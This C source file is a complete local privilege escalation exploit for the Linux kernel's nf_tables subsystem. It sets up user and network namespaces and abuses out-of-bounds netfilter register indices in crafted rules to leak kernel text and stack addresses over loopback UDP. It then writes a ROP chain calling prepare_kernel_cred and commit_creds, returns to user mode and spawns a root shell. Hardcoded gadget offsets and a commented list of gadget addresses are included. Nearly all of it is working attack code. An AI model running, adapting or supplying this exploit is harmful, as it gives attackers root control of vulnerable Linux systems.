#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdarg.h>
#include <sys/mman.h>

#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

unsigned long user_cs, user_ss, user_sp, user_rflags;

uint64_t kernel_address, kernel_stack;
uint64_t mmap_addr = 0x20000000;

uint64_t prepare_kernel_cred;
uint64_t commit_creds;
uint64_t pop_rdi_ret;
uint64_t pop_rsp_ret;
uint64_t mov_rdi_rax;
uint64_t native_write_cr4;
uint64_t cr4_pinned_bits;
uint64_t mov_ptr_rdi_0;
uint64_t swapgs_ret;
uint64_t iretq;

typedef struct udp_data {
	char* data;
	size_t size;
	uint16_t port;
	char* addr;
	size_t addr_size;
} udp_data;

typedef struct listener_data {
	uint16_t port;
	uint64_t data;
} listener_data;

struct list_head {
	struct list_head *next, *prev;
};

struct expr_ops {
	const char *name;
	uint32_t alloc_len;
	int	max_attr;
	void	(*init)(const struct nftnl_expr *e);
	void	(*free)(const struct nftnl_expr *e);
	int	(*set)(struct nftnl_expr *e, uint16_t type, const void *data, uint32_t data_len);
	const void *(*get)(const struct nftnl_expr *e, uint16_t type, uint32_t *data_len);
	int 	(*parse)(struct nftnl_expr *e, struct nlattr *attr);
	void	(*build)(struct nlmsghdr *nlh, const struct nftnl_expr *e);
	int	(*output)(char *buf, size_t len, uint32_t flags, const struct nftnl_expr *e);
};

struct nftnl_expr {
	struct list_head	head;
	uint32_t		flags;
	struct expr_ops		*ops;
	uint8_t			data[];
};

struct nftnl_rule {
        struct list_head head;

        uint32_t        flags;
        uint32_t        family;
        const char      *table;
        const char      *chain;
        uint64_t        handle;
        uint64_t        position;
        uint32_t        id;
        uint32_t        position_id;
        struct {
                        void            *data;
                        uint32_t        len;
        } user;
        struct {
                        uint32_t        flags;
                        uint32_t        proto;
        } compat;

        struct list_head expr_list;
};

void save_userland_registers(){
 __asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;" // saves the cs register
		"mov user_ss, ss;" // saves the ss register
		"mov user_sp, rsp;" // saves the stack pointer
		"pushf;" // pushes the flags on the stack
		"pop user_rflags;" // pops the flags from the stack to user_rflags
		".att_syntax;"
 );
	puts("[*] Saved userland registers");
	printf("[#] cs: 0x%lx \n", user_cs);
	printf("[#] ss: 0x%lx \n", user_ss);
	printf("[#] rsp: 0x%lx \n", user_sp);
	printf("[#] rflags: 0x%lx \n\n", user_rflags);

}

extern void spawnShell(){
	system("id");
	system("/bin/sh"); // we just spawn a shell
	exit(0);
}

void write_to_file(const char *which, const char *format, ...) {
	FILE * fu = fopen(which, "w");
	va_list args;
	va_start(args, format);
	if (vfprintf(fu, format, args) < 0) {
		perror("cannot write");
		exit(1);
	}
	fclose(fu);
}

void send_batch(struct mnl_nlmsg_batch *batch, uint32_t seq)
{
	struct mnl_socket *nl;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t portid;
	int ret, batching;

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) {
		perror("mnl_socket_open");
		exit(EXIT_FAILURE);
	}

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	portid = mnl_socket_get_portid(nl);

	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
			      mnl_nlmsg_batch_size(batch)) < 0) {
		perror("mnl_socket_send");
		exit(EXIT_FAILURE);
	}

	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	while (ret > 0) {
		ret = mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	}
	if (ret == -1) {
		perror("error");
		exit(EXIT_FAILURE);
	}
	mnl_socket_close(nl);
}



static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t dreg,
			uint32_t offset, uint32_t len)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("payload");
	if (e == NULL) {
		perror("expr payload oom");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);

	nftnl_rule_add_expr(r, e);
}
static void add_payload_set(struct nftnl_rule *r, uint32_t base, uint32_t offset, uint32_t len, uint32_t sreg){
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("payload");

	nftnl_expr_set_u32(e, NFTA_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_LEN, len);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_SREG, sreg);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_BASE, base);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_CSUM_TYPE, NFT_PAYLOAD_CSUM_NONE);

	nftnl_rule_add_expr(r, e);
}
static void add_cmp(struct nftnl_rule *r, uint32_t sreg, uint32_t op,
		    const void *data, uint32_t data_len)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("cmp");
	if (e == NULL) {
		perror("expr cmp oom");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_SREG, sreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_OP, op);
	nftnl_expr_set(e, NFTNL_EXPR_CMP_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);
}

static void add_bitwise(struct nftnl_rule *r, uint32_t sreg, uint32_t dreg, uint32_t len, uint32_t op, const void *data, uint32_t data_len)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("bitwise");
	if (e == NULL) {
		perror("expr bitwise oom");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTA_BITWISE_SREG, sreg);
	nftnl_expr_set_u32(e, NFTA_BITWISE_DREG, dreg);
	nftnl_expr_set_u32(e, NFTA_BITWISE_LEN, len);
	nftnl_expr_set_u32(e, NFTA_BITWISE_OP, op);
	nftnl_expr_set_data(e, NFTA_BITWISE_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);
}
static void add_counter(struct nftnl_rule *r)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("counter");
	if (e == NULL) {
		perror("expr counter oom");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_add_expr(r, e);
}
static void set_verdict(struct nftnl_rule* r, uint32_t verdict)
{
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("immediate");

	nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, 0); // 0 is verdict register

	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict); // send the verdict
	nftnl_rule_add_expr(r, e);
}

static struct nftnl_rule *setup_leak_rule(uint8_t family, const char *table, const char *chain, uint16_t port, uint32_t oob_offset)
{
	struct nftnl_rule *r = NULL;
	uint8_t proto;
	uint16_t dport;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// udp port(offset 2, 2 bytes) => NFT_REG32_01
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG32_01, offsetof(struct udphdr, dest), sizeof(uint16_t));
	
	uint16_t port_net = htons(port); // we have to convert from little-endian to big
	add_cmp(r, NFT_REG32_01, NFT_CMP_EQ, &port_net, sizeof port_net);

	/*
	// *** PREPARE BITWISE EXPRESSION ***
	uint32_t bitwise_len = 40; // read & write 40 bytes
	uint32_t bitwise_sreg = 0x3FFFFFFC; // &regs+0xF8*4
	uint32_t bitwise_dreg = NFT_REG32_00; //
	uint32_t bitwise_shift_value_data = 0; // shift 0
	uint32_t bitwise_shift_type = NFT_BITWISE_RSHIFT;

	add_bitwise(r, bitwise_sreg, bitwise_dreg, bitwise_len, bitwise_shift_type, &bitwise_shift_value_data, sizeof(bitwise_shift_value_data));
	*/

	// *** PREPARE PAYLOAD SET EXPRESSION ***
	uint32_t payload_base = NFT_PAYLOAD_TRANSPORT_HEADER;
	uint32_t payload_offset = 8;
	uint32_t payload_len = 0x20;
	uint32_t payload_sreg = oob_offset;
	add_payload_set(r, payload_base, payload_offset, payload_len, payload_sreg);
	// add_counter(r);
	set_verdict(r, NFT_CONTINUE);
	return r;
}
static struct nftnl_rule *setup_write_rule(uint8_t family, const char *table, const char *chain, uint16_t port, uint32_t oob_offset)
{
	struct nftnl_rule *r = NULL;
	uint8_t proto;
	uint16_t dport;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// udp port(offset 2, 2 bytes) => NFT_REG32_01
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG32_01, offsetof(struct udphdr, dest), sizeof(uint16_t));
	
	uint16_t port_net = htons(port); // we have to convert from little-endian to big
	add_cmp(r, NFT_REG32_01, NFT_CMP_EQ, &port_net, sizeof port_net);


	// saved rsp to NFT_REG32_00 
	uint32_t bitwise_shift_value_data = 0; // shift 0

	add_bitwise(r, 0x40000002, NFT_REG32_00, 40, NFT_BITWISE_RSHIFT, &bitwise_shift_value_data, sizeof(bitwise_shift_value_data));

	// control saved rsp in NFT_REG32_00
	bitwise_shift_value_data = 6;
	add_bitwise(r, NFT_REG32_00, NFT_REG32_00, 1, NFT_BITWISE_RSHIFT, &bitwise_shift_value_data, sizeof(bitwise_shift_value_data));
	add_bitwise(r, NFT_REG32_00, NFT_REG32_00, 1, NFT_BITWISE_LSHIFT, &bitwise_shift_value_data, sizeof(bitwise_shift_value_data));

	// save rop chain
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, oob_offset, 8, 0x50);

	// restore malicious saved rsp
	bitwise_shift_value_data = 0;
	add_bitwise(r, NFT_REG32_00, 0x40000002, 40, NFT_BITWISE_RSHIFT, &bitwise_shift_value_data, sizeof(bitwise_shift_value_data));

	// save rop chain
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, oob_offset, 8, 0x54);

	// overwrite 1byte of saved rsp 
	// add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG32_00, 8+8, 1);

	//add_bitwise(r, NFT_REG32_00, 0x40000002, 40, NFT_BITWISE_RSHIFT, &bitwise_shift_value_data, sizeof(bitwise_shift_value_data));


	set_verdict(r, NFT_CONTINUE);
	return r;
}

static struct nftnl_rule *setup_rule(uint8_t family, const char *table, const char *chain, uint16_t port)
{
	struct nftnl_rule *r = NULL;
	uint8_t proto;
	uint16_t dport;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// udp port(offset 2, 2 bytes) => NFT_REG32_01
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG32_01, offsetof(struct udphdr, dest), sizeof(uint16_t));
	
	uint16_t port_net = htons(port); // we have to convert from little-endian to big
	add_cmp(r, NFT_REG32_01, NFT_CMP_EQ, &port_net, sizeof port_net);
	
	add_counter(r);
	set_verdict(r, NFT_CONTINUE);
	return r;
}

static struct nftnl_table *table_add_parse(char* table_name) {
	struct nftnl_table *t; // create struct
	uint16_t family = AF_INET; // the family of the table
	t = nftnl_table_alloc(); // allocate the table
	if (t == NULL) {
		perror("[!] Couldn't allocate a table");
		exit(EXIT_FAILURE);
	}

	nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family); // set the family
	nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name); // set the name

	return t;
}

static struct nftnl_chain *chain_add_parse(char* table_name, char* chain_name, int hooknum)
{
	struct nftnl_chain *t;
	//int hooknum = NF_INET_LOCAL_OUT;

	t = nftnl_chain_alloc();
	if (t == NULL) {
		perror("[!] Couldn't allocate a chain");
		return NULL;
	}
	nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
	nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);
	nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0); // set priority to 0
	nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hooknum);
	return t;
}

void setup_table(char *table_name){
	struct mnl_socket *nl;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	uint32_t portid, seq, table_seq, family;
	struct nftnl_table *t;
	struct mnl_nlmsg_batch *batch;
	int ret;

	t = table_add_parse(table_name);
	if (t == NULL)
		exit(EXIT_FAILURE);

	seq = time(NULL);
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	table_seq = seq;
	family = nftnl_table_get_u32(t, NFTNL_TABLE_FAMILY);
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
				    NFT_MSG_NEWTABLE, family,
				    NLM_F_CREATE | NLM_F_ACK, seq++);
	nftnl_table_nlmsg_build_payload(nlh, t);
	nftnl_table_free(t);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	send_batch(batch, table_seq);

	printf("[*] table created: %s\n", table_name);
	return;
}

void setup_chain(char * table_name, char * chain_name, int hooknum) 
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	uint32_t seq, chain_seq;
	int family;
	struct nftnl_chain *t;
	struct mnl_nlmsg_batch *batch;

	t = chain_add_parse(table_name, chain_name, hooknum);
	if (t == NULL)
		exit(EXIT_FAILURE);

	seq = time(NULL);
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	chain_seq = seq;
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
				    NFT_MSG_NEWCHAIN, family,
				    NLM_F_CREATE | NLM_F_ACK, seq++);
	nftnl_chain_nlmsg_build_payload(nlh, t);
	nftnl_chain_free(t);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	send_batch(batch, chain_seq);

	printf("[*] chain created: %s\n", chain_name);
}



static int rule_cb(const struct nlmsghdr *nlh, void *data)
{
	struct nftnl_rule *t;
	char buf[4096];
	uint32_t *type = data;
	struct nftnl_expr * expr, expr2;

	t = nftnl_rule_alloc();
	if (t == NULL) {
		perror("OOM");
		goto err;
	}

	if (nftnl_rule_nlmsg_parse(nlh, t) < 0) {
		perror("nftnl_rule_nlmsg_parse");
		goto err_free;
	}

	//head = t->head;

	struct list_head * pos;
	expr = (struct nftnl_expr *)(t->expr_list.next);

	for (pos=t->expr_list.next; pos!=t->expr_list.next->prev; pos=pos->next) {
		expr = (struct nftnl_expr *)pos;
		printf("expr: %p\n", expr);
		printf("head: %p\n", expr->head);
		printf("flags: %p\n", expr->flags);
		printf("ops: %p (%s)\n", expr->ops, expr->ops->name);

		printf("data: %x\n", expr->data);
	}

	nftnl_rule_snprintf(buf, sizeof(buf), t, *type, 0);
	printf("%s\n", buf);

err_free:
	nftnl_rule_free(t);
err:
	return MNL_CB_OK;
}

void add_rule(char * table_name, char * chain_name, uint16_t port)
{
	struct mnl_socket *nl;
	struct nftnl_rule *r;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	uint8_t family;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL), rule_seq;
	int ret;

	r = setup_rule(NFPROTO_IPV4, table_name, chain_name, port);


	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	rule_seq = seq;
	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
			NFT_MSG_NEWRULE,
			nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY),
			NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);

	nftnl_rule_nlmsg_build_payload(nlh, r);
	nftnl_rule_free(r);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	send_batch(batch, rule_seq);

	printf("[*] rule added\n");
}
void add_leak_rule(char * table_name, char * chain_name, uint16_t port, uint32_t oob_offset)
{
	struct mnl_socket *nl;
	struct nftnl_rule *r;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	uint8_t family;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL), rule_seq;
	int ret;

	r = setup_leak_rule(NFPROTO_IPV4, table_name, chain_name, port, oob_offset);


	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	rule_seq = seq;
	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
			NFT_MSG_NEWRULE,
			nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY),
			NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);

	nftnl_rule_nlmsg_build_payload(nlh, r);
	nftnl_rule_free(r);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	send_batch(batch, rule_seq);

	printf("[*] rule added\n");
}
void add_write_rule(char * table_name, char * chain_name, uint16_t port, uint32_t oob_offset)
{
	struct mnl_socket *nl;
	struct nftnl_rule *r;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	uint8_t family;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL), rule_seq;
	int ret;

	r = setup_write_rule(NFPROTO_IPV4, table_name, chain_name, port, oob_offset);


	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	rule_seq = seq;
	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
			NFT_MSG_NEWRULE,
			nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY),
			NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);

	nftnl_rule_nlmsg_build_payload(nlh, r);
	nftnl_rule_free(r);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	send_batch(batch, rule_seq);

	printf("[*] rule added\n");
}

static int setup_sandbox(void)
{
	uid_t uid = getuid();
	gid_t gid = getgid();

	if (unshare(CLONE_NEWUSER) < 0)
	{
		perror("[-] unshare(CLONE_NEWUSER)");
		return -1;
	}

	if (unshare(CLONE_NEWNET) < 0)
	{
		perror("[-] unshare(CLONE_NEWNET)");
		return -1;
	}

	printf("[+] unshare done\n");

	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set);
	if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) 
	{
		perror("[-] sched_setaffinity");
		return -1;
	}

	// now we map uid and gid
	write_to_file("/proc/self/uid_map", "0 %d 1", uid);
	// deny setgroups (see user_namespaces(7))
	write_to_file("/proc/self/setgroups", "deny");
	// remap gid
	write_to_file("/proc/self/gid_map", "0 %d 1", gid);

	return 0;
}

struct nftnl_rule * get_rule(int family, char * table_name, char * chain_name, uint16_t port) 
{
	struct mnl_socket *nl;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	uint32_t portid, seq, type = NFTNL_OUTPUT_DEFAULT;
	const char *table = NULL, *chain = NULL;
	struct nftnl_rule *r;
	int ret;


	seq = time(NULL);
	nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, family,
				    NLM_F_DUMP, seq);

	r = setup_rule(family, table_name, chain_name, port);
	if (!r) {
		perror("setup_rule");
		exit(EXIT_FAILURE);
	}
	nftnl_rule_nlmsg_build_payload(nlh, r);


	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) {
		perror("mnl_socket_open");
		exit(EXIT_FAILURE);
	}

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	portid = mnl_socket_get_portid(nl);

	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
		perror("mnl_socket_send");
		exit(EXIT_FAILURE);
	}

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	while (ret > 0) {
		ret = mnl_cb_run(buf, ret, seq, portid, rule_cb, &type);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	}
	if (ret == -1) {
		perror("error");
		exit(EXIT_FAILURE);
	}
	mnl_socket_close(nl);
}
void *send_udp_packet(void *arg)
{
	// first lets sleep for a second to wait for the listener to be setup
	sleep(0.5);
	udp_data *udata = (udp_data *) arg;
	size_t size = udata->size;
	char* data = udata->data;
	uint16_t port = udata->port;
	char* dest_addr = udata->addr;

	int sock;
	struct sockaddr_in addr;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(dest_addr);

	sendto(sock, data, size, 0, (struct sockaddr *)&addr, sizeof(addr));

	close(sock);

	pthread_exit(NULL);
}
void *send_tcp_packet(void *arg)
{
	// first lets sleep for a second to wait for the listener to be setup
	sleep(0.5);
	udp_data *udata = (udp_data *) arg;
	size_t size = udata->size;
	char* data = udata->data;
	uint16_t port = udata->port;
	char* dest_addr = udata->addr;

	int sock;
	struct sockaddr_in addr;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(dest_addr);

	sendto(sock, data, size, 0, (struct sockaddr *)&addr, sizeof(addr));

	close(sock);

	pthread_exit(NULL);
}
void *receive_address(void *arg){

	listener_data *ldata = (listener_data *) arg;
	uint16_t port = ldata->port;

	char message[800];
	memset(message, 0, 800);
	int bytes;
	int ret;

	int soc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	if (soc < 0) {
		perror("[!] Error setting up UDP socket");
		exit(EXIT_FAILURE);
	}

	int reuse_address = 1;

	setsockopt(soc, SOL_SOCKET, SO_REUSEADDR, &reuse_address, sizeof reuse_address);

	struct sockaddr_in addr;
	inet_aton("127.0.0.1", &addr.sin_addr);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);


	ret = bind(soc, (struct sockaddr*)&addr, sizeof(addr));
	if (ret < 0) {
		perror("[!] Problem binding");
		exit(EXIT_FAILURE);
	}
	printf("[*] Listening on port %d \n", port);
	bytes = recvfrom(soc, (char *)message, sizeof message, MSG_WAITALL, (struct sockaddr *)&addr, sizeof(addr));
	message[bytes] = '\0';
	//printf("got: %lx\n", *(long long *)message);
	//printf("got: %s\n", message);
	ldata->data = *(uint64_t *) message;
	//memcpy(&ldata->data, &message, sizeof(uint64_t));
	pthread_exit(NULL);
}
uint64_t leak(uint32_t oob_offset)
{
	char *table_name = "leak_table";
	char *chain_name = "leak_chain";

	setup_table(table_name);
	setup_chain(table_name, chain_name, NF_INET_LOCAL_OUT);
	add_leak_rule(table_name, chain_name, 9999, oob_offset);

	// get_rule(AF_INET, table_name, chain_name, 9999); 

	// lets actually leak this bad boy
	pthread_t thread_id_send;
	struct udp_data dummy_data;
	char* As = "AAAAAAAABBBBBBBBCCCCCCCCCDDDDDDDDEEEEEEEE";
	char* dest_addr = "127.0.0.1";
	dummy_data.data = As;
	dummy_data.size = strlen(As);
	dummy_data.port = 9999;
	dummy_data.addr = dest_addr;
	dummy_data.addr_size = sizeof(dummy_data.addr);
	pthread_create(&thread_id_send, NULL, send_udp_packet, (void *)&dummy_data);

	// lets receive the address
	struct listener_data ldata;
	ldata.port = 9999;
	ldata.data = 0;
	pthread_t thread_id_receive;
	pthread_create(&thread_id_receive, NULL, receive_address, (void *)&ldata);

	pthread_join(thread_id_send, NULL);
	pthread_join(thread_id_receive, NULL);
	return ldata.data;
}
void oob_write(uint32_t oob_offset)
{
	pthread_t thread_id_send;
	struct udp_data dummy_data;
	uint32_t* As;
	char* dest_addr;
	struct listener_data;
	char * write_table = "write_table";
	char * write_chain = "write_chain";

	setup_table(write_table);
	setup_chain(write_table, write_chain, NF_INET_LOCAL_OUT);

	add_write_rule(write_table, write_chain, 9999, oob_offset);

	//get_rule(AF_INET, write_table, write_chain, 9999); 

	// commit_creds(prepare_kernel_cred(0));


	As = (int *)malloc(0x100);
	As[0] = (kernel_stack >> 32) & 0xffffffff;  // high dword of rsp
        *(uint64_t *)((uint64_t)As+12)=pop_rdi_ret;
        *(uint64_t *)((uint64_t)As+20)=0x0;
        *(uint64_t *)((uint64_t)As+28)=prepare_kernel_cred;
        *(uint64_t *)((uint64_t)As+36)=mov_rdi_rax;
        *(uint64_t *)((uint64_t)As+44)=commit_creds;
        *(uint64_t *)((uint64_t)As+52)=pop_rsp_ret;
        *(uint64_t *)((uint64_t)As+60)=mmap_addr;
        *(uint64_t *)((uint64_t)As+68)=0x8888888888888888;
        *(uint64_t *)((uint64_t)As+76)=0x9999999999999999;
	dest_addr = "127.0.0.1";
	dummy_data.data = As;
	dummy_data.size = 0x80;
	dummy_data.port = 9999;
	dummy_data.addr = dest_addr;
	dummy_data.addr_size = sizeof(dummy_data.addr);
	pthread_create(&thread_id_send, NULL, send_udp_packet, (void *)&dummy_data);

	pthread_join(thread_id_send, NULL);	
}
int main()
{
	struct mnl_socket *nl;
	struct nftnl_rule *r;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	uint8_t family;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL);
	int ret, batching;

	if (setup_sandbox())
	{
		printf("[-] setup_sandbox() failed");
		return -1;
	}

	system("ip link set dev lo up"); // setting the loopback up
	// system("/bin/sh");

	kernel_address = leak(0x3FFFFFFC)-0x8a455e; // &regs+0xf8*4
	kernel_stack = leak(0x3FFFFFFC+6); // &regs+0xf8*4+8*3

	printf("    kernel_address: %lx\n", kernel_address);
	printf("    kernel_stack: %lx\n", kernel_stack);


        prepare_kernel_cred = kernel_address+0x8c120;
        commit_creds = kernel_address+0x8be80;
        pop_rdi_ret = kernel_address+0x1538;
        pop_rsp_ret = kernel_address+0x4f08bf;
        mov_rdi_rax = kernel_address+0xfd618;
        native_write_cr4 = kernel_address+0x32000;
        cr4_pinned_bits = kernel_address+0x143c740;
        mov_ptr_rdi_0 = kernel_address+0x3f2a72;
	swapgs_ret = kernel_address+0xbbf9df;
	iretq = kernel_address+0x280fb;

	uint64_t mmap_addr = 0x20000000;
	if (mmap_addr != mmap((void*)mmap_addr,0x1000,0x7,0x22,0xffffffff,0)) {
		printf("[-] mmap\n");
		return -1;
	}

	save_userland_registers();
        *(uint64_t *)(mmap_addr+0)=swapgs_ret;
        *(uint64_t *)(mmap_addr+8)=iretq;
        *(uint64_t *)(mmap_addr+16)=(uint64_t)spawnShell;
        *(uint64_t *)(mmap_addr+24)=user_cs;
        *(uint64_t *)(mmap_addr+32)=user_rflags;
        *(uint64_t *)(mmap_addr+40)=user_sp;
        *(uint64_t *)(mmap_addr+48)=user_ss;
        *(uint64_t *)(mmap_addr+56)=0xdeaddead;


	oob_write(0x40000003);	// &regs+0xFF*4
	return 0;
}

/*
leak : kernel_address: ffffffff818a455e
0xffffffff810fd618: mov rdi, rax; mov qword ptr [rip + 0x1def7de], rdi; ret;
+(0xffffffff818a455e-0xffffffff810fd618)
0xffffffff811051e3: mov rdi, rax; test rax, rax; jne 0x3051b8; ret;
0xffffffff81001538 : pop rdi ; ret
+(0xffffffff818a455e-0xffffffff81001538)
0xffffffff813bce8c : xor rax, rcx ; mov qword ptr [rdi], rax ; ret
0xffffffff819c5a08 : xor eax, eax ; mov qword ptr [rdi], rax ; mov rax, r8 ; ret
0xffffffff8197d3a1 : xlatb ; mov qword ptr [rdi + 0x30], 0 ; ret
0xffffffff813f2a70 : xor eax, eax ; mov qword ptr [rdi], 0 ; ret
*/
